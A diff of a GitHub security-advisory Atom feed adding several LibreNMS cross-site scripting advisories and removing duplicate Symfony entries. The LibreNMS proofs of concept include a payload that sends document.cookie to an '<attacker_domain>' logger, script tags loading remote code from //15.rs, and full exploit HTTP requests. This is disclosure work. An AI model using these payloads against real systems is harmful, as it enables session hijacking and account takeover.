+            <uri>https://github.com/advisories/GHSA-qr8f-5qqg-j3wg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:39:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a Reflected XSS ('Cross-site Scripting') in librenms/includes/functions.php]]></title>
+        <id>https://github.com/advisories/GHSA-v7w9-63xh-6r3w</id>
+        <link href="https://github.com/advisories/GHSA-v7w9-63xh-6r3w"/>
+        <updated>2024-11-15T15:34:38.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Reflected Cross-Site Scripting (XSS) vulnerability in the "section" parameter of the "logs" tab of a device allows attackers to inject arbitrary JavaScript. This vulnerability results in the execution of malicious code when a user accesses the page with a malicious "section" parameter, potentially compromising their session and enabling unauthorized actions. The issue arises from a lack of sanitization in the "report_this()" function.</p>
+<h3 id="details">Details</h3>
+<p>The "section" parameter of the "logs" tab is vulnerable to reflected XSS. An attacker can inject the following XSS payload into the "section" parameter:
+<code>&lt;script&gt;constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();&lt;%2fscript&gt;</code></p>
+<p>When the page is loaded with this malicious parameter, the script executes immediately. This vulnerability occurs due to the lack of sanitization in the "report_this()" function. Other endpoints using this same function may also be vulnerable.</p>
+<p>The vulnerable sink is located here:
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/functions.php#L523">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/functions.php#L523</a>
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/logs.inc.php#L93">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/logs.inc.php#L93</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Inject the following payload into the "section" parameter of the "logs" tab:</li>
+</ol>
+<p><code>&lt;script&gt;constructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();&lt;%2fscript&gt;</code>
+2. Access the page with the injected payload.
+3. Observe that the injected script executes when the page is loaded.</p>
+<p>Example URL: <code>http://&lt;your_url&gt;/device/device=1/tab=logs/section=%3Cscript%3Econstructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();%3C%2fscript%3E/</code></p>
+<p>Example Request:</p>
+<pre><code class="language-http">GET /device/device=1/tab=logs/section=%3Cscript%3Econstructor['constructor'](atob('Y29uZmlybShkb2N1bWVudC5kb21haW4p'))();%3C%2fscript%3E/ HTTP/1.1
+Host: &lt;your_host&gt;
+Cookie: &lt;your_cookie&gt;
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows attackers to execute arbitrary JavaScript in the context of a user’s session by crafting a malicious URL. The attack could lead to session hijacking, unauthorized actions, or further exploitation by injecting malicious scripts.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-v7w9-63xh-6r3w">https://github.com/librenms/librenms/security/advisories/GHSA-v7w9-63xh-6r3w</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/6a14a9bd767c6e452e4df77a24126c3eeb93dcbf">https://github.com/librenms/librenms/commit/6a14a9bd767c6e452e4df77a24126c3eeb93dcbf</a></li>
+<li><a href="https://github.com/advisories/GHSA-v7w9-63xh-6r3w">https://github.com/advisories/GHSA-v7w9-63xh-6r3w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v7w9-63xh-6r3w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:34:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/app/Http/Controllers/Table/EditPortsController.php]]></title>
+        <id>https://github.com/advisories/GHSA-xh4g-c9p6-5jxg</id>
+        <link href="https://github.com/advisories/GHSA-xh4g-c9p6-5jxg"/>
+        <updated>2024-11-15T15:30:06.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Stored Cross-Site Scripting (XSS) vulnerability in the "Port Settings" page allows authenticated users to inject arbitrary JavaScript through the "name" parameter when creating a new Port Group. This vulnerability results in the execution of malicious code when the "Port Settings" page is visited after the affected Port Group is added to a device, potentially compromising user sessions and allowing unauthorized actions.</p>
+<h3 id="details">Details</h3>
+<p>When creating a new "Port Group," an attacker can inject the following XSS payload into the "name" parameter:
+<code>&lt;script/src=//15.rs&gt;&lt;/script&gt;</code></p>
+<p>Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>
+<p>The payload triggers when the affected Port Group is added to a device and the "Port Settings" page is reloaded. The vulnerability is due to insufficient sanitization of the "name" parameter. The sink responsible for this issue is:
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/app/Http/Controllers/Table/EditPortsController.php#L69">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/app/Http/Controllers/Table/EditPortsController.php#L69</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a new Port Group using the following payload in the "name" parameter:</li>
+</ol>
+<p><code>name&lt;script/src=//15.rs&gt;&lt;/script&gt;</code>
+2. Add the Port Group to a device's port settings.
+3. Reload the "Port Settings" page.
+4. Observe that the injected script executes.</p>
+<p>Example Request:</p>
+<pre><code class="language-http">POST /port-groups HTTP/1.1
+Host: &lt;your_host&gt;
+Content-Type: application/x-www-form-urlencoded
+Cookie: &lt;your_cookie&gt;
+
+_token=&lt;your_token&gt;&amp;name=name&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;desc=descr&lt;script/src=//15.rs&gt;&lt;/script&gt;
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the "Port Settings" page of a device. This could result in the compromise of user accounts and unauthorized actions performed on their behalf.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-xh4g-c9p6-5jxg">https://github.com/librenms/librenms/security/advisories/GHSA-xh4g-c9p6-5jxg</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/82a744bfe29017b8b58b5752ab9e1b335bedf0a0">https://github.com/librenms/librenms/commit/82a744bfe29017b8b58b5752ab9e1b335bedf0a0</a></li>
+<li><a href="https://github.com/advisories/GHSA-xh4g-c9p6-5jxg">https://github.com/advisories/GHSA-xh4g-c9p6-5jxg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xh4g-c9p6-5jxg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:30:05.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device/capture.inc.php]]></title>
+        <id>https://github.com/advisories/GHSA-rmr4-x6c9-jc68</id>
+        <link href="https://github.com/advisories/GHSA-rmr4-x6c9-jc68"/>
+        <updated>2024-11-15T15:28:26.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Stored Cross-Site Scripting (XSS) vulnerability in the "Capture Debug Information" page allows authenticated users to inject arbitrary JavaScript through the "hostname" parameter when creating a new device. This vulnerability results in the execution of malicious code when the "Capture Debug Information" page is visited, redirecting the user and sending non-httponly cookies to an attacker-controlled domain.</p>
+<h3 id="details">Details</h3>
+<p>When creating a new device, an attacker can inject the following XSS payload into the "hostname" parameter:</p>
+<pre><code>test'" autofocus onfocus="document.location='https://&lt;attacker_domain&gt;/logger.php?c='+document.cookie"
+</code></pre>
+<p>(Note: You may need to URL-encode the '+' sign in the payload.)</p>
+<p>The payload triggers automatically when visiting the "Capture Debug Information" page for the device, redirecting the user's browser to the attacker-controlled domain along with any non-httponly cookies.</p>
+<p>The vulnerability is due to insufficient sanitization of the "url" variable before it is output in the HTML. This is evident in the following lines of code:</p>
+<p><a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/capture.inc.php#L55">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/capture.inc.php#L55</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a new device with the following payload in the "hostname" parameter:</li>
+</ol>
+<pre><code>test'" autofocus onfocus="document.location='https://&lt;attacker_domain&gt;/logger.php?c='+document.cookie"
+</code></pre>
+<ol start="2">
+<li>Save the device.</li>
+<li>Navigate to the "Capture Debug Information" page for the device.</li>
+<li>Observe that the injected script triggers and redirects the user to the attacker's domain, sending cookies.</li>
+</ol>
+<p>Example Request:</p>
+<pre><code class="language-http">POST /addhost HTTP/1.1
+Host: &lt;your_host&gt;
+Content-Type: application/x-www-form-urlencoded
+Cookie: &lt;your_cookie&gt;
+
+_token=&lt;your_token&gt;&amp;hostname=test%27%22+autofocus+onfocus%3D%22document.location%3D%27https%3A%2F%2F&lt;attacker_domain&gt;%2Flogger.php%3Fc%3D%27%2bdocument.cookie%22&amp;snmp=on&amp;sysName=&amp;hardware=&amp;os=&amp;os_id=&amp;snmpver=v2c&amp;port=&amp;transport=udp&amp;port_assoc_mode=ifIndex&amp;community=&amp;authlevel=noAuthNoPriv&amp;authname=&amp;authpass=&amp;authalgo=SHA&amp;cryptopass=&amp;cryptoalgo=AES&amp;force_add=on&amp;Submit=
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the "Capture Debug Information" page of the device. The attacker can redirect the user to a malicious domain and capture non-httponly cookies, potentially compromising the user's account and allowing unauthorized actions.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68">https://github.com/librenms/librenms/security/advisories/GHSA-rmr4-x6c9-jc68</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/af15eabbb1752985d36f337cecf137a947e170f6">https://github.com/librenms/librenms/commit/af15eabbb1752985d36f337cecf137a947e170f6</a></li>
+<li><a href="https://github.com/advisories/GHSA-rmr4-x6c9-jc68">https://github.com/advisories/GHSA-rmr4-x6c9-jc68</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rmr4-x6c9-jc68</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:27:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/edituser.inc.php]]></title>
+        <id>https://github.com/advisories/GHSA-888j-pjqh-fx58</id>
+        <link href="https://github.com/advisories/GHSA-888j-pjqh-fx58"/>
+        <updated>2024-11-15T15:25:57.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Stored Cross-Site Scripting (XSS) vulnerability in the "Manage User Access" page allows authenticated users to inject arbitrary JavaScript through the "bill_name" parameter when creating a new bill. This vulnerability can lead to the execution of malicious code when visiting the "Bill Access" dropdown in the user's "Manage Access" page, potentially compromising user sessions and allowing unauthorized actions.</p>
+<h3 id="details">Details</h3>
+<p>When creating a new bill, an attacker can inject the following XSS payload into the "bill_name" parameter:
+<code>test1'"&gt;&lt;script/src=//15.rs&gt;</code></p>
+<p>Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>
+<p>The payload triggers in the "Bill Access" dropdown when the user's "Manage Access" page is visited. The sink responsible for this issue is:
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/edituser.inc.php#L309">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/edituser.inc.php#L309</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a new bill using the following payload in the "bill_name" parameter:</li>
+</ol>
+<p><code>test1'"&gt;&lt;script/src=//15.rs&gt;</code>
+2. Save the bill.
+3. Navigate to the "Manage Access" page for the user.
+4. Observe that the injected script executes in the "Bill Access" dropdown.</p>
+<p>Example Request:</p>
+<pre><code class="language-http">POST /bill/bill_id=2/view=edit/ HTTP/1.1
+Host: &lt;your_host&gt;
+Content-Type: application/x-www-form-urlencoded
+Cookie: &lt;your_cookie&gt;
+
+_token=&lt;your_token&gt;&amp;action=update_bill&amp;bill_name=test1%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&amp;bill_type=cdr&amp;bill_cdr=&amp;bill_cdr_type=Kbps&amp;dir_95th=in&amp;bill_quota=&amp;bill_quota_type=MB&amp;bill_day=1&amp;bill_custid=test2%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&amp;bill_ref=test3%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&amp;bill_notes=test4%27%22%3E%3Cscript%2Fsrc%3D%2F%2F15.rs%3E&amp;Submit=Save
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the "Manage Access" page. The attacker can perform unauthorized actions or compromise user accounts by exploiting this vulnerability.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58">https://github.com/librenms/librenms/security/advisories/GHSA-888j-pjqh-fx58</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/237f4d2e818170171dfad6efad36a275cd2ba8d0">https://github.com/librenms/librenms/commit/237f4d2e818170171dfad6efad36a275cd2ba8d0</a></li>
+<li><a href="https://github.com/advisories/GHSA-888j-pjqh-fx58">https://github.com/advisories/GHSA-888j-pjqh-fx58</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-888j-pjqh-fx58</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:25:56.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a stored XSS in ExamplePlugin with Device's Notes]]></title>
+        <id>https://github.com/advisories/GHSA-c86q-rj37-8f85</id>
+        <link href="https://github.com/advisories/GHSA-c86q-rj37-8f85"/>
+        <updated>2024-11-15T15:17:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The application fail to sanitising inputs properly and rendering the code from user input to browser which allow an attacker to execute malicious javascript code.</p>
+<h3 id="details">Details</h3>
+<p>User with Admin role can add Notes to a device, the application did not properly sanitize the user input, when the ExamplePlugin enable, if java script code is inside the device's Notes, its will be trigger.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>As an admin user, enable the ExamplePlugin.</li>
+</ol>
+<p><img alt="image" src="https://github.com/user-attachments/assets/409f3a0c-7fac-46e3-8140-84749a120dd9"></p>
+<ol start="2">
+<li>Add the payload <code>&lt;img src="x" onerror="alert(document.cookie)"&gt;</code> into the device Notes</li>
+</ol>
+<p><img alt="image" src="https://github.com/user-attachments/assets/c2a57dbd-ea07-4166-8b29-61be6ad6c2b6"></p>
+<ol start="3">
+<li>Once visit the Overview of the Device, a pop-up will show up.</li>
+</ol>
+<p><img alt="image" src="https://github.com/user-attachments/assets/3c9b87c3-d010-49e7-bd13-4a715db4e0c3"></p>
+<h3 id="impact">Impact</h3>
+<p>It could allow authenticated users to execute arbitrary JavaScript code in the context of other users' sessions.
+Impacted users could have their accounts compromised, enabling the attacker to perform unauthorized actions on their behalf.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-c86q-rj37-8f85">https://github.com/librenms/librenms/security/advisories/GHSA-c86q-rj37-8f85</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/24b142d753898e273ec20b542a27dd6eb530c7d8">https://github.com/librenms/librenms/commit/24b142d753898e273ec20b542a27dd6eb530c7d8</a></li>
+<li><a href="https://github.com/advisories/GHSA-c86q-rj37-8f85">https://github.com/advisories/GHSA-c86q-rj37-8f85</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c86q-rj37-8f85</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-11-15T15:17:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[librenms/librenms] LibreNMS has a stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/api-access.inc.php]]></title>
+        <id>https://github.com/advisories/GHSA-gfwr-xqmj-j27v</id>
+        <link href="https://github.com/advisories/GHSA-gfwr-xqmj-j27v"/>
+        <updated>2024-11-15T15:11:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A Stored Cross-Site Scripting (XSS) vulnerability in the API-Access page allows authenticated users to inject arbitrary JavaScript through the "token" parameter when creating a new API token. This vulnerability can result in the execution of malicious code in the context of other users' sessions, compromising their accounts and enabling unauthorized actions.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability occurs when creating a new API Token. An attacker can inject arbitrary JavaScript into the "token" parameter, which is then executed when the API Access page is visited. The payload is triggered twice—once in the "Token Hash" column and once in the "QR Code" column.</p>
+<p>The payload used to exploit this vulnerability is: <code>'"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;</code></p>
+<p>Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>
+<p>The vulnerability is due to insufficient sanitization of the "token_hash" variable before it is output in the HTML. This is evident in the following lines of code:</p>
+<p><a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L152">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L152</a>
+<a href="https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L153">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/api-access.inc.php#L153</a></p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a new API token with the following payload in the "token" parameter: <code>'"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;</code></li>
+<li>Save the token.</li>
+<li>Navigate to the API Access page.</li>
+<li>Observe that the injected script executes twice, once in the "Token Hash" column and once in the "QR Code" column.</li>
+</ol>
+<pre><code class="language-http">POST /ajax_form.php HTTP/1.1
+Host: &lt;your_host&gt;
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-CSRF-TOKEN: &lt;your_token&gt;
+X-Requested-With: XMLHttpRequest
+Cookie: &lt;your_cookie&gt;
+
+_token=&lt;your_token&gt;&amp;user_id=1&amp;token='"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;description=t'"&gt;&lt;script/src=//15.rs&gt;&amp;type=token-item-create
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>The vulnerability allows authenticated users to execute arbitrary JavaScript code in the context of other users' sessions. This can lead to account compromise and enable unauthorized actions on behalf of the impacted users.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/librenms/librenms/security/advisories/GHSA-gfwr-xqmj-j27v">https://github.com/librenms/librenms/security/advisories/GHSA-gfwr-xqmj-j27v</a></li>
+<li><a href="https://github.com/librenms/librenms/commit/25988a937cbaebd2ba4c0517510206c404dfb359">https://github.com/librenms/librenms/commit/25988a937cbaebd2ba4c0517510206c404dfb359</a></li>
+<li><a href="https://github.com/advisories/GHSA-gfwr-xqmj-j27v">https://github.com/advisories/GHSA-gfwr-xqmj-j27v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gfwr-xqmj-j27v</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-15T15:11:45.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[symfony/symfony] Symfony allows internal address and port enumeration by NoPrivateNetworkHttpClient]]></title>
         <id>https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</id>
@@ -227,831 +903,5 @@
         </author>
         <category label="severity" term="HIGH"/>
         <published>2024-11-13T18:29:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[symfony/security-http] Symfony has an Authentication Bypass via RememberMe]]></title>
-        <id>https://github.com/advisories/GHSA-cg23-qf8f-62rr</id>
-        <link href="https://github.com/advisories/GHSA-cg23-qf8f-62rr"/>
-        <updated>2024-11-14T23:55:43.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>When consuming a persisted remember-me cookie, Symfony does not check if the username persisted in the database matches the username attached with the cookie, leading to authentication bypass.</p>
-<h3 id="resolution">Resolution</h3>
-<p>The <code>PersistentRememberMeHandler</code> class now ensures the submitted username is the cookie owner.</p>
-<p>The patch for this issue is available <a href="https://github.com/symfony/symfony/commit/81354d392c5f0b7a52bcbd729d6f82501e94135a">here</a> for branch 5.4.</p>
-<h3 id="credits">Credits</h3>
-<p>We would like to thank Moritz Rauch - Pentryx AG for reporting the issue and Jérémy Derussé for providing the fix.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/symfony/symfony/security/advisories/GHSA-cg23-qf8f-62rr">https://github.com/symfony/symfony/security/advisories/GHSA-cg23-qf8f-62rr</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/81354d392c5f0b7a52bcbd729d6f82501e94135a">https://github.com/symfony/symfony/commit/81354d392c5f0b7a52bcbd729d6f82501e94135a</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/security-http/CVE-2024-51996.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/security-http/CVE-2024-51996.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-51996.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-51996.yaml</a></li>
-<li><a href="https://symfony.com/cve-2024-51996">https://symfony.com/cve-2024-51996</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-51996">https://nvd.nist.gov/vuln/detail/CVE-2024-51996</a></li>
-<li><a href="https://github.com/advisories/GHSA-cg23-qf8f-62rr">https://github.com/advisories/GHSA-cg23-qf8f-62rr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cg23-qf8f-62rr</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-13T18:29:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[symfony/security-http] Symfony has an Authentication Bypass via RememberMe]]></title>
-        <id>https://github.com/advisories/GHSA-cg23-qf8f-62rr</id>
-        <link href="https://github.com/advisories/GHSA-cg23-qf8f-62rr"/>
-        <updated>2024-11-14T23:55:43.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>When consuming a persisted remember-me cookie, Symfony does not check if the username persisted in the database matches the username attached with the cookie, leading to authentication bypass.</p>
-<h3 id="resolution">Resolution</h3>
-<p>The <code>PersistentRememberMeHandler</code> class now ensures the submitted username is the cookie owner.</p>
-<p>The patch for this issue is available <a href="https://github.com/symfony/symfony/commit/81354d392c5f0b7a52bcbd729d6f82501e94135a">here</a> for branch 5.4.</p>
-<h3 id="credits">Credits</h3>
-<p>We would like to thank Moritz Rauch - Pentryx AG for reporting the issue and Jérémy Derussé for providing the fix.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/symfony/symfony/security/advisories/GHSA-cg23-qf8f-62rr">https://github.com/symfony/symfony/security/advisories/GHSA-cg23-qf8f-62rr</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/81354d392c5f0b7a52bcbd729d6f82501e94135a">https://github.com/symfony/symfony/commit/81354d392c5f0b7a52bcbd729d6f82501e94135a</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/security-http/CVE-2024-51996.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/security-http/CVE-2024-51996.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-51996.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-51996.yaml</a></li>
-<li><a href="https://symfony.com/cve-2024-51996">https://symfony.com/cve-2024-51996</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-51996">https://nvd.nist.gov/vuln/detail/CVE-2024-51996</a></li>
-<li><a href="https://github.com/advisories/GHSA-cg23-qf8f-62rr">https://github.com/advisories/GHSA-cg23-qf8f-62rr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cg23-qf8f-62rr</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-13T18:29:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[symfony/http-client] Symfony allows internal address and port enumeration by NoPrivateNetworkHttpClient]]></title>
-        <id>https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</id>
-        <link href="https://github.com/advisories/GHSA-9c3x-r3wp-mgxm"/>
-        <updated>2024-11-13T18:51:05.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>When using the <code>NoPrivateNetworkHttpClient</code>, some internal information is still leaking during host resolution, which leads to possible IP/port enumeration.</p>
-<h3 id="resolution">Resolution</h3>
-<p>The <code>NoPrivateNetworkHttpClient</code> now filters blocked IPs earlier to prevent such leaks.</p>
-<p>The fisrt patch for this issue is available <a href="https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b">here</a> for branch 5.4.</p>
-<p>The second one is available <a href="https://github.com/symfony/symfony/commit/b4bf5afdbdcb2fd03da513ee03beeabeb551e5fa">here</a> for branch 5.4 also.</p>
-<h3 id="credits">Credits</h3>
-<p>We would like to thank Linus Karlsson and Chris Smith for reporting the issue and Nicolas Grekas for providing the fix.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm">https://github.com/symfony/symfony/security/advisories/GHSA-9c3x-r3wp-mgxm</a></li>
-<li><a href="https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b">https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/http-client/CVE-2024-50342.yaml</a></li>
-<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/symfony/symfony/CVE-2024-50342.yaml</a></li>
-<li><a href="https://symfony.com/cve-2024-50342">https://symfony.com/cve-2024-50342</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-50342">https://nvd.nist.gov/vuln/detail/CVE-2024-50342</a></li>
-<li><a href="https://github.com/advisories/GHSA-9c3x-r3wp-mgxm">https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2024-11-06T15:16:09.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[symfony/http-client] Symfony allows internal address and port enumeration by NoPrivateNetworkHttpClient]]></title>
-        <id>https://github.com/advisories/GHSA-9c3x-r3wp-mgxm</id>
-        <link href="https://github.com/advisories/GHSA-9c3x-r3wp-mgxm"/>
-        <updated>2024-11-13T18:51:05.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="description">Description</h3>
-<p>When using the <code>NoPrivateNetworkHttpClient</code>, some internal information is still leaking during host resolution, which leads to possible IP/port enumeration.</p>
-<h3 id="resolution">Resolution</h3>
-<p>The <code>NoPrivateNetworkHttpClient</code> now filters blocked IPs earlier to prevent such leaks.</p>
-<p>The fisrt patch for this issue is available <a href="https://github.com/symfony/symfony/commit/296d4b34a33b1a6ca5475c6040b3203622520f5b">here</a> for branch 5.4.</p>
-<p>The second one is available <a href="https://github.com/symfony/symfony/commit/b4bf5afdbdcb2fd03da513ee03beeabeb551e5fa">here</a> for branch 5.4 also.</p>
-<h3 id="credits">Credits</h3>
-<p>We would like to thank Linus Karlsson and Chris Smith for reporting the issue and Nicolas Grekas for providing the fix.</p>
